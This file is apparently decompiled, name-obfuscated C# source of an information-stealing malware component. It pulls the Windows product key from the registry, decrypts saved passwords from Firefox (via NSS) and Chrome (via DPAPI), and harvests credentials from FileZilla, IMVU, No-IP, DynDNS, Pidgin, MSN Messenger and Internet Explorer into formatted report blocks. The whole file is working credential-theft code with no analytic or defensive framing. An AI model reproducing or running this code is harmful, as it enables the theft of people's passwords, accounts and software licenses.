using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using PRbZe7jbKrAYFJMnccccIcC0;
using xk7VyJJZ8hsKInK2GHXPG105;

public class GClass0
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int GDelegate0(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int ePaL3LTx6OJakbCs56(ref UWAkG6OZvGEnvCWr51 data, ref UWAkG6OZvGEnvCWr51 result, int cx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long HAYOWMF1htb5MWDt54(long slot, bool loadCerts, long wincx);

	[Flags]
	public enum hlvfxEIML9yNZdWe57
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long kMQ0DvgpoUPC3Anu53();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long kvycnTF79BkSl1zQ52(string configdir);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct pCRXMRqlVuBXcEv458
	{
		public int cbSize;

		public hlvfxEIML9yNZdWe57 dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	public struct UWAkG6OZvGEnvCWr51
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	public class vdUkjIXT6E1jjvY350
	{
		public static long cb;

		public static byte[] abID;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct xkbIxO0z6nZUd6yT59
	{
		public int cbData;

		public IntPtr pbData;
	}

	private opIuk3Si18 nQA0GlnTFbs4pheY181;

	private static IntPtr NSS3;

	public static string signon;

	private Class0 P6urwnlTljQLWdQX182;

	public GClass0()
	{
		nQA0GlnTFbs4pheY181 = new opIuk3Si18();
		P6urwnlTljQLWdQX182 = new Class0();
	}

	public string RUlDnukkvu2R9naZ217()
	{
		string text = "";
		string text2 = null;
		checked
		{
			try
			{
				byte[] sourceArray = (byte[])((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_LocalMachine().OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", writable: false)!.GetValue("DigitalProductId");
				byte[] array = new byte[15];
				Array.Copy(sourceArray, 52, array, 0, 15);
				string text3 = "BCDFGHJKMPQRTVWXY2346789";
				int num = 0;
				do
				{
					short num2 = 0;
					int num3 = 14;
					do
					{
						num2 = (short)((num2 * 256) ^ array[num3]);
						array[num3] = (byte)Math.Round(Conversion.Int((double)num2 / 24.0));
						num2 = (short)unchecked(num2 % 24);
						num3 += -1;
					}
					while (num3 >= 0);
					text = text3.Substring(num2, 1) + text;
					num++;
				}
				while (num <= 24);
				int num4 = 4;
				do
				{
					text = text.Insert(num4 * 5, "-");
					num4 += -1;
				}
				while (num4 >= 1);
				text2 = text2 + text + "\r\n";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text2, (string)null, false) != 0)
			{
				text2 = "--------------------------------------------------------------------------------------\r\n[ Windows Key ]\r\n--------------------------------------------------------------------------------------\r\n" + text2 + "\r\n";
			}
			return text2;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static long beUL5uZZPJZ2FJGA220(string configdir)
	{
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\mozcrt19.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nspr4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plc4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plds4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\ssutil3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\sqlite3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nssutil3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\softokn3.dll");
		NSS3 = LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nss3.dll");
		IntPtr procAddress = GetProcAddress(NSS3, "NSS_Init");
		kvycnTF79BkSl1zQ52 kvycnTF79BkSl1zQ = (kvycnTF79BkSl1zQ52)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(kvycnTF79BkSl1zQ52));
		return kvycnTF79BkSl1zQ(configdir);
	}

	public static long NhSGcNzQ5C4VVKrT221()
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
		kMQ0DvgpoUPC3Anu53 kMQ0DvgpoUPC3Anu = (kMQ0DvgpoUPC3Anu53)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(kMQ0DvgpoUPC3Anu53));
		return kMQ0DvgpoUPC3Anu();
	}

	public static long zkpqZVEutbxGKVRw222(long slot, bool loadCerts, long wincx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_Authenticate");
		HAYOWMF1htb5MWDt54 hAYOWMF1htb5MWDt = (HAYOWMF1htb5MWDt54)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(HAYOWMF1htb5MWDt54));
		return hAYOWMF1htb5MWDt(slot, loadCerts, wincx);
	}

	public static int VmwSS3hnE4Gtp344223(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
		GDelegate0 gDelegate = (GDelegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(GDelegate0));
		return gDelegate(arenaOpt, outItemOpt, inStr, inLen);
	}

	public static int i5skkgBSCod1gS6a224(ref UWAkG6OZvGEnvCWr51 data, ref UWAkG6OZvGEnvCWr51 result, int cx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
		ePaL3LTx6OJakbCs56 ePaL3LTx6OJakbCs = (ePaL3LTx6OJakbCs56)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ePaL3LTx6OJakbCs56));
		return ePaL3LTx6OJakbCs(ref data, ref result, cx);
	}

	public string Kx0zdz1w31LVeb4q225()
	{
		string text = null;
		checked
		{
			try
			{
				bool flag = false;
				long num = 0L;
				string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
				string[] array = directories;
				foreach (string text2 in array)
				{
					if (flag)
					{
						break;
					}
					string[] files = Directory.GetFiles(text2);
					string[] array2 = files;
					foreach (string input in array2)
					{
						if (flag)
						{
							break;
						}
						if (Regex.IsMatch(input, "signons.sqlite"))
						{
							beUL5uZZPJZ2FJGA220(text2);
							signon = input;
						}
					}
				}
				string baseName = signon;
				UWAkG6OZvGEnvCWr51 uWAkG6OZvGEnvCWr = default(UWAkG6OZvGEnvCWr51);
				UWAkG6OZvGEnvCWr51 result = default(UWAkG6OZvGEnvCWr51);
				UWAkG6OZvGEnvCWr51 result2 = default(UWAkG6OZvGEnvCWr51);
				SvKHkFFpVaj23LA760 svKHkFFpVaj23LA = new SvKHkFFpVaj23LA760(baseName);
				DataTable dataTable = svKHkFFpVaj23LA.vYZPZPgOdYXXvhac262("SELECT * FROM moz_logins;");
				num = NhSGcNzQ5C4VVKrT221();
				zkpqZVEutbxGKVRw222(num, loadCerts: true, 0L);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable.Rows.GetEnumerator();
					UWAkG6OZvGEnvCWr51 uWAkG6OZvGEnvCWr2 = default(UWAkG6OZvGEnvCWr51);
					while (enumerator.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator.Current;
						string text3 = Convert.ToString(dataRow["formSubmitURL"].ToString());
						text = text + "URL: " + text3 + "\r\n";
						StringBuilder stringBuilder = new StringBuilder(dataRow["encryptedUsername"].ToString());
						int value = VmwSS3hnE4Gtp344223(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
						IntPtr ptr = new IntPtr(value);
						object? obj = Marshal.PtrToStructure(ptr, typeof(UWAkG6OZvGEnvCWr51));
						UWAkG6OZvGEnvCWr51 data = ((obj != null) ? ((UWAkG6OZvGEnvCWr51)obj) : uWAkG6OZvGEnvCWr2);
						if (i5skkgBSCod1gS6a224(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
						{
							byte[] array3 = new byte[result.SECItemLen - 1 + 1];
							ptr = new IntPtr(result.SECItemData);
							Marshal.Copy(ptr, array3, 0, result.SECItemLen);
							text = text + "USER: " + Encoding.ASCII.GetString(array3) + "\r\n";
						}
						StringBuilder stringBuilder2 = new StringBuilder(dataRow["encryptedPassword"].ToString());
						int value2 = VmwSS3hnE4Gtp344223(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
						ptr = new IntPtr(value2);
						object? obj2 = Marshal.PtrToStructure(ptr, typeof(UWAkG6OZvGEnvCWr51));
						UWAkG6OZvGEnvCWr51 data2 = ((obj2 != null) ? ((UWAkG6OZvGEnvCWr51)obj2) : uWAkG6OZvGEnvCWr2);
						if (i5skkgBSCod1gS6a224(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
						{
							byte[] array3 = new byte[result2.SECItemLen - 1 + 1];
							ptr = new IntPtr(result2.SECItemData);
							Marshal.Copy(ptr, array3, 0, result2.SECItemLen);
							text = text + "PASSWORD: " + Encoding.ASCII.GetString(array3) + "\r\n";
						}
						text += "\r\n";
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				text += "\r\n";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				text = "--------------------------------------------------------------------------------------\r\n[ FireFox 3.5+ ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
			}
			return text;
		}
	}

	public string method_0()
	{
		string text = null;
		try
		{
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
			if (File.Exists(text2))
			{
				SvKHkFFpVaj23LA760 svKHkFFpVaj23LA = new SvKHkFFpVaj23LA760(text2);
				DataTable dataTable = svKHkFFpVaj23LA.vYZPZPgOdYXXvhac262("SELECT * FROM logins;");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable.Rows.GetEnumerator();
					while (enumerator.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator.Current;
						string text3 = Convert.ToString(dataRow["origin_url"].ToString());
						string text4 = Convert.ToString(dataRow["username_value"].ToString());
						string text5 = jMTOurHellOzkxFN228((byte[])dataRow["password_value"]);
						if ((Operators.CompareString(text4, "", false) != 0) & (Operators.CompareString(text5, "", false) != 0))
						{
							string text6 = "Host: " + text3 + "\r\nUser: " + text4 + "\r\nPassword: " + text5 + "\r\n\r\n";
							text += text6;
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Chrome ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref xkbIxO0z6nZUd6yT59 pDataIn, string szDataDescr, ref xkbIxO0z6nZUd6yT59 pOptionalEntropy, IntPtr pvReserved, ref pCRXMRqlVuBXcEv458 pPromptStruct, int dwFlags, ref xkbIxO0z6nZUd6yT59 pDataOut);

	public static string jMTOurHellOzkxFN228(byte[] Datas)
	{
		xkbIxO0z6nZUd6yT59 pDataIn = default(xkbIxO0z6nZUd6yT59);
		xkbIxO0z6nZUd6yT59 pDataOut = default(xkbIxO0z6nZUd6yT59);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = Datas.Length;
		gCHandle.Free();
		xkbIxO0z6nZUd6yT59 xkbIxO0z6nZUd6yT = default(xkbIxO0z6nZUd6yT59);
		xkbIxO0z6nZUd6yT59 pOptionalEntropy = xkbIxO0z6nZUd6yT;
		pCRXMRqlVuBXcEv458 pCRXMRqlVuBXcEv = default(pCRXMRqlVuBXcEv458);
		pCRXMRqlVuBXcEv458 pPromptStruct = pCRXMRqlVuBXcEv;
		IntPtr pvReserved = default(IntPtr);
		CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
		checked
		{
			byte[] array = new byte[pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	public string U0XItdnCBFAvfTb4229()
	{
		string text = null;
		try
		{
			string text2 = ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml");
			string[] array = text2.Split(new char[1] { '\r' });
			string[] array2 = array;
			foreach (string text3 in array2)
			{
				if (text3.Contains("<Host>"))
				{
					text = text + "Host: " + text3.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<Port>"))
				{
					text = text + ":" + text3.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<User>"))
				{
					text = text + "User: " + text3.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<Pass>"))
				{
					text = text + "Pass: " + text3.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
				}
			}
			text += "\r\n";
			text2 = ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml");
			array = text2.Split(new char[1] { '\r' });
			string[] array3 = array;
			foreach (string text4 in array3)
			{
				if (text4.Contains("<Host>"))
				{
					text = text + "Host: " + text4.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<Port>"))
				{
					text = text + ":" + text4.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<User>"))
				{
					text = text + "User: " + text4.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<Pass>"))
				{
					text = text + "Pass: " + text4.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
				}
			}
			text += "\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ FileZilla ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string method_1()
	{
		string text = null;
		try
		{
			string text2 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "username", (object)null));
			string text3 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "password", (object)null));
			if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text3, "", false) != 0))
			{
				text = text + "\r\nUsername : " + text2 + "\r\nPassword : " + htouIVY5phdPRcYr231(text3);
				text += "\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ IMVU ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string htouIVY5phdPRcYr231(string Text)
	{
		try
		{
			object obj = null;
			object obj2 = default(object);
			object obj3 = default(object);
			if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
			{
				do
				{
					object obj4 = Strings.Mid(Text, Conversions.ToInteger(obj2), 2);
					obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)"&h", obj4))))));
					obj2 = Operators.AddObject(obj2, (object)1);
				}
				while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
			}
			return Conversions.ToString(obj);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string aJywmBrCJqUZGGVj232(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[checked(charCount - 1 + 1)];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string h3eMvGl5P5E45rFB233()
	{
		string text = null;
		try
		{
			string text2 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object)null));
			string text3 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object)null));
			string text4 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object)null));
			string data = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object)null));
			string text5 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object)null));
			string text6 = "\r\n";
			if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text3, "", false) != 0))
			{
				text = text + "Username: " + text2 + text6 + "Password: " + aJywmBrCJqUZGGVj232(text3) + text6 + "Proxy Username:" + text4 + text6 + "Proxy Password: " + aJywmBrCJqUZGGVj232(data) + text6 + "Proxy Port: " + text5 + text6 + text6;
				text += "\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ No IP ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string v4xWJSaF1LLi0ZoI234()
	{
		string text = null;
		checked
		{
			try
			{
				string text2 = null;
				string text3 = null;
				string text4 = null;
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
				string text5 = folderPath + "\\DynDNS\\Updater\\config.dyndns";
				string text6 = ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().ReadAllText(text5);
				string[] array = text6.Split(new char[1] { '\r' });
				string[] array2 = array;
				foreach (string text7 in array2)
				{
					if (text7.Contains("Username="))
					{
						text2 = Strings.Mid(text7, 11);
					}
					else if (text7.Contains("Password="))
					{
						text3 = Strings.Mid(text7, 11);
					}
				}
				int num = Strings.Len(text3);
				for (int j = 1; j <= num; j += 2)
				{
					text4 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversion.Val("&H" + Strings.Mid(text3, j, 2)))));
				}
				int num2 = Strings.Len(text4);
				int num3 = default(int);
				for (int j = 1; j <= num2; j++)
				{
					StringType.MidStmtStr(ref text4, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text4, j, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", num3 + 1, 1)))));
					unchecked
					{
						num3 = checked(num3 + 1) % 8;
					}
				}
				if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
				{
					text = text + "User: " + text2 + "\r\nPassword: " + text4 + "\r\n";
					text += "\r\n";
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				text = "--------------------------------------------------------------------------------------\r\n[ DynDNS ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
			}
			return text;
		}
	}

	public string mUxNYcVtosGgWnwh235()
	{
		string text = null;
		try
		{
			string text2 = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
			string text3 = Conversions.ToString(1);
			string text4 = "\r\n";
			text3 = ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().OpenTextFileReader(text2).ReadToEnd();
			string text5 = null;
			string[] array = text3.Split(new char[1] { '\r' });
			text3 = null;
			string[] array2 = array;
			foreach (string text6 in array2)
			{
				if (text6.Contains("<protocol>"))
				{
					text5 = text5 + "Protocol:" + text6 + text4;
				}
				if (text6.Contains("<name>"))
				{
					text5 = text5 + "Name:" + text6 + text4;
				}
				if (text6.Contains("<password>"))
				{
					text5 = text5 + "Password:" + text6 + text4 + text4;
				}
			}
			text += text5;
			text += "\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Pidgin ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string LjuC8YzpSyKJV35Q236()
	{
		string text = null;
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = nQA0GlnTFbs4pheY181.GetEnumerator();
				while (enumerator.MoveNext())
				{
					VSONKGl017 vSONKGl = (VSONKGl017)enumerator.Current;
					text = text + "Login: " + vSONKGl.Login + "\r\n";
					text = text + "Password: " + vSONKGl.Password + "\r\n\r\n";
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ MSN - Live Messenger ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string GWHbTRDi94yhbTJD237()
	{
		string text = null;
		try
		{
			bool flag = false;
			string text2 = Conversions.ToString(1);
			string text3 = null;
			string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
			string[] array = directories;
			foreach (string path in array)
			{
				if (flag)
				{
					break;
				}
				string[] files = Directory.GetFiles(path);
				string[] array2 = files;
				foreach (string text4 in array2)
				{
					if (flag)
					{
						break;
					}
					if (Regex.IsMatch(text4, "signons3.txt"))
					{
						text3 = text4;
					}
				}
			}
			text2 = ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().OpenTextFileReader(text3).ReadToEnd();
			string[] array3 = text2.Split(new char[1] { '\r' });
			text2 = null;
			UWAkG6OZvGEnvCWr51 result = default(UWAkG6OZvGEnvCWr51);
			string[] array4 = array3;
			UWAkG6OZvGEnvCWr51 uWAkG6OZvGEnvCWr = default(UWAkG6OZvGEnvCWr51);
			foreach (string text5 in array4)
			{
				if ((text5.Length != 0) & text5.StartsWith(".") & !text5.StartsWith("#"))
				{
					text += "\r\n";
				}
				else if (text5.StartsWith("http") | text5.Contains("//") | text5.Contains("ftp."))
				{
					text = text + "URL: " + text5 + "\r\n";
				}
				else if (text5.ToLower().Contains("username") | text5.ToLower().Contains("login") | text5.ToLower().Contains("email"))
				{
					text += "User: ";
				}
				else if (text5.Contains("*"))
				{
					text += "Password: ";
				}
				else if (text5.Contains("AAAAAAAAA"))
				{
					StringBuilder stringBuilder = new StringBuilder(text5);
					int value = VmwSS3hnE4Gtp344223(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
					IntPtr ptr = new IntPtr(value);
					object? obj = Marshal.PtrToStructure(ptr, typeof(UWAkG6OZvGEnvCWr51));
					UWAkG6OZvGEnvCWr51 data = ((obj != null) ? ((UWAkG6OZvGEnvCWr51)obj) : uWAkG6OZvGEnvCWr);
					if (i5skkgBSCod1gS6a224(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
					{
						byte[] array5 = new byte[checked(result.SECItemLen - 1 + 1)];
						ptr = new IntPtr(result.SECItemData);
						Marshal.Copy(ptr, array5, 0, result.SECItemLen);
						text = text + Encoding.ASCII.GetString(array5) + "\r\n";
					}
				}
				else if (text5.Contains("---"))
				{
					text += "\r\n";
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ FireFox 2-3 ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string euxHvMAol8Uprbyk238()
	{
		string text = null;
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = P6urwnlTljQLWdQX182.GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Password", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
					{
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "URL: "), NewLateBinding.LateGet(objectValue, (Type)null, "URL", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"));
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "Username: "), NewLateBinding.LateGet(objectValue, (Type)null, "UserName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"));
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "Password: "), NewLateBinding.LateGet(objectValue, (Type)null, "Password", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"), (object)"\r\n"));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Internet Explorer 7-8 ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}
}
